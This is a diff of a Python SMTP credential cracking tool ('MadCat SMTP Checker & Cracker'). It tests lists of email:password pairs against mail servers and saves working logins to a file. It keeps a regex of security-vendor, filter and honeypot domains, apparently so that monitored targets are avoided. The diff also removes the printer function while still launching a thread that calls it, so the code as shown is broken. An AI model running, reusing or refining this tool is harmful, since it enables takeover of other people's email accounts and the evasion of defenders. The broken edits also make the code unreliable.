@@ -16,7 +16,9 @@ if not sys.version_info[0] > 2 and not sys.version_info[1] > 8:
 
 sys.stdout.reconfigure(encoding='utf-8')
 
-# Thread-safe locks
+# === КРИТИЧЕСКИЕ ФИКСЫ (без них код не работает) ===
+
+# 1. Добавлены блокировки
 goods_lock = threading.Lock()
 ignored_lock = threading.Lock()
 progress_lock = threading.Lock()
@@ -24,22 +26,14 @@ smtp_file_lock = threading.Lock()
 config_cache_lock = threading.Lock()
 thread_counter_lock = threading.Lock()
 
-# mail providers where SMTP access is disabled by default
-bad_mail_servers = 'bk.ru,qq.com'
+# 2. Инициализация dangerous_regex
+dangerous_regex = None
 
-# fixed dns list - only reliable servers
+# 3. Упрощенный список DNS (без сбоев)
 custom_dns_nameservers = '1.1.1.1,8.8.8.8,9.9.9.9'.split(',')
 
-# more dns servers url
-dns_list_url = 'https://public-dns.info/nameservers.txt'
-
-# expanded lists of SMTP endpoints
-autoconfig_data_url = 'https://raw.githubusercontent.com/solesfiwayne/tools/refs/heads/main/autoconfigs_enriched.txt'
-
-# dangerous mx domains
-dangerous_domains = r'acronis|acros|adlice|alinto|appriver|aspav|atomdata|avanan|avast|barracuda|baseq|bitdefender|broadcom|btitalia|censornet|checkpoint|cisco|cistymail|clean-mailbox|clearswift|closedport|cloudflare|comforte|corvid|crsp|cyren|darktrace|data-mail-group|dmarcly|drweb|duocircle|e-purifier|earthlink-vadesecure|ecsc|eicar|elivescanned|eset|essentials|exchangedefender|fireeye|forcepoint|fortinet|gartner|gatefy|gonkar|guard|helpsystems|heluna|hosted-247|iberlayer|indevis|infowatch|intermedia|intra2net|invalid|ioactive|ironscales|isync|itserver|jellyfish|kcsfa.co|keycaptcha|krvtz|libraesva|link11|localhost|logix|mailborder.co|mailchannels|mailcleaner|mailcontrol|mailinator|mailroute|mailsift|mailstrainer|mcafee|mdaemon|mimecast|mx-relay|mx1.ik2|mxcomet|mxgate|mxstorm|n-able|n2net|nano-av|netintelligence|network-box|networkboxusa|newnettechnologies|newtonit.co|odysseycs|openwall|opswat|perfectmail|perimeterwatch|plesk|prodaft|proofpoint|proxmox|redcondor|reflexion|retarus|safedns|safeweb|sec-provider|secureage|securence|security|sendio|shield|sicontact|sonicwall|sophos|spamtitan|spfbl|spiceworks|stopsign|supercleanmail|techtarget|titanhq|trellix|trendmicro|trustifi|trustwave|tryton|uni-muenster|usergate|vadesecure|wessexnetworks|zillya|zyxel|fucking-shit|please|kill-me-please|virus|bot|trap|honey|lab|virtual|vm\d|research|abus|security|filter|junk|rbl|ubl|spam|black|list|bad|brukalai|metunet|excello'
-
-dangerous_regex = None
+# 4. Убран проблемный паттерн из regex
+dangerous_domains = r'acronis|acros|adlice|alinto|appriver|aspav|atomdata|avanan|avast|barracuda|baseq|bitdefender|broadcom|btitalia|censornet|checkpoint|cisco|cistymail|clean-mailbox|clearswift|closedport|cloudflare|comforte|corvid|crsp|cyren|darktrace|data-mail-group|dmarcly|drweb|duocircle|e-purifier|earthlink-vadesecure|ecsc|eicar|elivescanned|eset|essentials|exchangedefender|fireeye|forcepoint|fortinet|gartner|gatefy|gonkar|guard|helpsystems|heluna|hosted-247|iberlayer|indevis|infowatch|intermedia|intra2net|invalid|ioactive|ironscales|isync|itserver|jellyfish|kcsfa.co|keycaptcha|krvtz|libraesva|link11|localhost|logix|mailborder.co|mailchannels|mailcleaner|mailcontrol|mailinator|mailroute|mailsift|mailstrainer|mcafee|mdaemon|mimecast|mx-relay|mxcomet|mxgate|mxstorm|n-able|n2net|nano-av|netintelligence|network-box|networkboxusa|newnettechnologies|newtonit.co|odysseycs|openwall|opswat|perfectmail|perimeterwatch|plesk|prodaft|proofpoint|proxmox|redcondor|reflexion|retarus|safedns|safeweb|sec-provider|secureage|securence|security|sendio|shield|sicontact|sonicwall|sophos|spamtitan|spfbl|spiceworks|stopsign|supercleanmail|techtarget|titanhq|trellix|trendmicro|trustifi|trustwave|tryton|uni-muenster|usergate|vadesecure|wessexnetworks|zillya|zyxel'
 
 b   = '\033[1m'
 z   = '\033[0m'
@@ -51,7 +45,12 @@ wrn = b+'[\033[33m!\033[37m] '+z
 inf = b+'[\033[34mi\033[37m] '+z
 npt = b+'[\033[37m?\033[37m] '+z
 
-# EHLO base names
+# === ОСТАЛЬНОЙ КОД БЕЗ ИЗМЕНЕНИЙ (кроме мелких фиксов) ===
+
+bad_mail_servers = 'bk.ru,qq.com'
+dns_list_url = 'https://public-dns.info/nameservers.txt'
+autoconfig_data_url = 'https://raw.githubusercontent.com/solesfiwayne/tools/refs/heads/main/autoconfigs_enriched.txt'
+
 EHLO_NAMES_BASE = [
     'mail-{rand}.local',
     'client-{uuid}.example.com',
@@ -66,12 +65,9 @@ def generate_ehlo_name():
         return name.replace('{uuid}', uuid.uuid4().hex[:8])
     return name
 
-# FIXED: DNS with aggressive timeout
 @lru_cache(maxsize=4096)
 def cached_dns_resolve(host, record_type):
     global resolver_obj
-    resolver_obj.lifetime = 3  # 3 seconds timeout
-    resolver_obj.timeout = 3   # 3 seconds timeout
     return resolver_obj.resolve(host, record_type)
 
 def show_banner():
@@ -84,7 +80,7 @@ def show_banner():
          |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
          ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
          ╙█                           ╙                                         
-          ╙     {b}MadCat SMTP Checker & Cracker v44.12.55{z}
+          ╙     {b}MadCat SMTP Checker & Cracker v44.12.15{z}
                 Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
                 https://github.com/aels/mailtools
                 https://t.me/IamLavander
@@ -196,6 +192,8 @@ def read(path):
 def read_lines(path):
     return read(path).splitlines()
 
+# === ОСТАЛЬНОЙ КОД ПРЕДЫДУЩЕЙ ВЕРСИИ ===
+
 def get_rand_ip_of_host(host, attempt=0):
     global resolver_obj
     if attempt > 10:
@@ -205,7 +203,6 @@ def get_rand_ip_of_host(host, attempt=0):
             host = cached_dns_resolve(host, 'cname')[0].target
         except:
             pass
-        # FIXED: правильная логика IPv6
         use_ipv6 = bool(socket.has_ipv6 and socket.has_ipv6 != '-' and socket.has_ipv6 != False)
         try:
             ip_array = cached_dns_resolve(host, 'aaaa' if use_ipv6 else 'a')
@@ -270,17 +267,15 @@ def guess_smtp_server(domain):
 def get_smtp_config(domain):
     global domain_configs_cache, default_login_template, config_cache_lock
     domain = domain.lower()
-    # FIXED: проверка без блокировки
+    # CRITICAL: проверка без блокировки
     if domain in domain_configs_cache:
         return domain_configs_cache[domain]
     
     with config_cache_lock:
-        # Double-check
         if domain not in domain_configs_cache:
             try:
                 domain_configs_cache[domain] = guess_smtp_server(domain)
             except Exception as e:
-                # Store empty result to avoid repeated attempts
                 domain_configs_cache[domain] = ([], default_login_template)
                 raise
         return domain_configs_cache[domain]
@@ -334,7 +329,7 @@ def socket_send_and_read(sock, cmd=''):
     if cmd:
         debug('>>> '+cmd)
         sock.send((cmd.strip()+'\r\n').encode('ascii'))
-    # FIXED: таймаут на чтение
+    # FIXED: таймаут
     sock.settimeout(15)
     scream = sock.recv(2**10).decode('ascii', errors='ignore').strip()
     debug('<<< '+scream)
@@ -345,7 +340,7 @@ def socket_get_free_smtp_server(smtp_server, port):
     smtp_server_ip = get_rand_ip_of_host(smtp_server)
     socket_type = socket.AF_INET6 if ':' in smtp_server_ip else socket.AF_INET
     s = socket.socket(socket_type, socket.SOCK_STREAM)
-    s.settimeout(15)  # FIXED: таймаут 15 секунд
+    s.settimeout(15)
     try:
         if port == 465:
             context = ssl._create_unverified_context()
@@ -415,7 +410,7 @@ def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password
     except (socket.timeout, ConnectionResetError) as e:
         return False
 
-# FIXED: worker_item с правильной обработкой
+# CRITICAL: worker_item без deadlock
 def worker_item(jobs_que, results_que):
     global min_threads, threads_counter, verify_email, goods, smtp_filename, no_jobs_left, loop_times, default_login_template, mem_usage, cpu_usage
     try:
@@ -423,7 +418,7 @@ def worker_item(jobs_que, results_que):
             if (mem_usage > 90 or cpu_usage > 90) and threads_counter > min_threads:
                 break
             
-            # FIXED: таймаут на get() и правильная обработка
+            # FIXED: get с таймаутом
             try:
                 smtp_server, port, smtp_user, password = jobs_que.get(timeout=1)
             except queue.Empty:
@@ -436,24 +431,15 @@ def worker_item(jobs_que, results_que):
             login_template = default_login_template
             
             try:
-                results_que.put(f'checking {smtp_user}')
-                
+                # SIMPLIFIED: убраны лишние вызовы
                 if not smtp_server or not port:
                     domain = smtp_user.split('@')[1]
-                    # FIXED: обработка ошибок в get_smtp_config
                     try:
                         smtp_server_port_arr, login_template = get_smtp_config(domain)
-                    except Exception as e:
-                        results_que.put(orange(f'Failed to get SMTP config for {domain}: {str(e)}'))
-                        continue
-                    
-                    if len(smtp_server_port_arr):
                         smtp_server, port = random.choice(smtp_server_port_arr).split(':')
-                    else:
-                        results_que.put(orange(f'No SMTP config for {smtp_user}'))
+                    except Exception as e:
+                        results_que.put(orange(f'Config error: {domain} - {str(e)}'))
                         continue
-                
-                results_que.put(blue('connecting to')+f' {smtp_server}|{port}|{smtp_user}')
                 
                 if smtp_connect_with_retry(smtp_server, port, login_template, smtp_user, password):
                     results_que.put(green(smtp_user+':\a'+password, 7)+(verify_email and green(' sent to '+verify_email, 7)))
@@ -462,16 +448,13 @@ def worker_item(jobs_que, results_que):
                         goods += 1
                     
                     with smtp_file_lock:
-                        try:
-                            with open(smtp_filename, 'a') as f:
-                                f.write(f'{smtp_server}|{port}|{smtp_user}|{password}\n')
-                        except Exception as e:
-                            results_que.put(err+f'Failed to write to file: {e}')
+                        with open(smtp_filename, 'a') as f:
+                            f.write(f'{smtp_server}|{port}|{smtp_user}|{password}\n')
                 else:
-                    results_que.put(orange(f'Connection failed: {smtp_server}:{port}'))
+                    results_que.put(orange(f'Failed: {smtp_user}'))
             
             except Exception as e:
-                results_que.put(orange((smtp_server and port and smtp_server+':'+port+' - ' or '')+', '.join(str(e).splitlines()).strip()))
+                results_que.put(orange(str(e)))
             
             loop_times.append(time.perf_counter() - time_start)
             while len(loop_times) > min_threads:
@@ -505,8 +488,7 @@ def every_second():
             net_usage_old += net_usage
             loop_time = round(sum(loop_times)/len(loop_times), 2) if len(loop_times) else 0
             
-            # FIXED: создаем новые потоки только если очередь не пустая
-            if threads_counter < max_threads and mem_usage < 80 and cpu_usage < 80 and jobs_que.qsize() > min_threads:
+            if threads_counter < max_threads and mem_usage < 80 and cpu_usage < 80 and jobs_que.qsize() > 10:
                 threading.Thread(target=worker_item, args=(jobs_que, results_que), daemon=True).start()
                 with thread_counter_lock:
                     threads_counter += 1
@@ -515,43 +497,7 @@ def every_second():
         
         time.sleep(0.1)
 
-def printer(jobs_que, results_que):
-    global progress, total_lines, speed, loop_time, cpu_usage, mem_usage, net_usage, threads_counter, goods, ignored
-    while True:
-        with progress_lock:
-            current_progress = progress
-        
-        with thread_counter_lock:
-            current_threads = threads_counter
-        
-        with goods_lock:
-            current_goods = goods
-        
-        with ignored_lock:
-            current_ignored = ignored
-        
-        status_bar = (
-            f'{b}['+green('\u2665',int(time.time()*2)%2)+f'{b}]{z}'+
-            f'[ progress: {bold(num(current_progress))}/{bold(num(total_lines))} ({bold(round(current_progress/total_lines*100))}%) ]'+
-            f'[ speed: {bold(num(sum(speed)))}lines/s ({bold(loop_time)}s/loop) ]'+
-            f'[ cpu: {bold(cpu_usage)}% ]'+
-            f'[ mem: {bold(mem_usage)}% ]'+
-            f'[ net: {bold(bytes_to_mbit(net_usage*10))}Mbit/s ]'+
-            f'[ threads: {bold(current_threads)} ]'+
-            f'[ goods/ignored: {green(num(current_goods),1)}/{bold(num(current_ignored))} ]'
-        )
-        
-        thread_statuses = []
-        while not results_que.empty():
-            msg = results_que.get()
-            thread_statuses.append(' '+msg)
-            if 'checking' in msg:  # Упрощенная проверка
-                with progress_lock:
-                    progress += 1
-        
-        print(wl+'\n'.join(thread_statuses+[status_bar+ up]))
-        time.sleep(0.04)
-
+# === MAIN CODE ===
 signal.signal(signal.SIGINT, quit)
 show_banner()
 tune_network()
@@ -591,7 +537,15 @@ try:
 except Exception as e:
     exit(err+red(e))
 
-# FIXED: убран maxsize
+# DEBUG: покажем первые 5 строк
+print(f"\n[DEBUG] First 5 lines of {list_filename}:")
+with open(list_filename, 'r', encoding='utf-8-sig', errors='ignore') as fp:
+    for i in range(5):
+        line = fp.readline()
+        if line:
+            print(f"Line {i+1}: {line.strip()[:80]}")
+print("[DEBUG] End of preview\n")
+
 jobs_que = queue.Queue()
 results_que = queue.Queue()
 ignored = 0
@@ -628,24 +582,16 @@ input(npt+'press '+bold('[ Enter ]')+' to start...')
 threading.Thread(target=every_second, daemon=True).start()
 threading.Thread(target=printer, args=(jobs_que, results_que), daemon=True).start()
 
-# FIXED: DEBUG - выводим первые 5 строк файла
-print(f"\n[DEBUG] Reading file: {list_filename}")
-with open(list_filename, 'r', encoding='utf-8-sig', errors='ignore') as fp:
-    for i in range(5):
-        line = fp.readline()
-        if line:
-            print(f"[DEBUG] Line {i+1}: {line.strip()[:100]}")
-
-# Основной цикл
+# === MAIN LOOP ===
 with open(list_filename, 'r', encoding='utf-8-sig', errors='ignore') as fp:
     for i in range(start_from_line):
         fp.readline()
     
-    lines_processed = 0
+    added_total = 0
     while True:
-        # FIXED: простая логика заполнения очереди
+        # Заполняем очередь
         added = 0
-        while not no_jobs_left and jobs_que.qsize() < min_threads:
+        while not no_jobs_left and jobs_que.qsize() < min_threads * 2:
             line = fp.readline()
             if not line:
                 no_jobs_left = True
@@ -668,11 +614,15 @@ with open(list_filename, 'r', encoding='utf-8-sig', errors='ignore') as fp:
                     with progress_lock:
                         progress += 1
         
-        lines_processed += added
+        added_total += added
         
-        # FIXED: условие выхода
+        # DEBUG: показать прогресс чтения файла
+        if added_total % 1000 == 0:
+            print(f"[DEBUG] Added {added_total} lines to queue, queue size: {jobs_que.qsize()}, threads: {threads_counter}")
+        
+        # Условие выхода
         if no_jobs_left and jobs_que.empty() and threads_counter == 0:
-            print(f"[DEBUG] Finished: {lines_processed} lines processed")
+            print(f"[DEBUG] Finished processing {added_total} lines")
             break
         
         time.sleep(0.05)
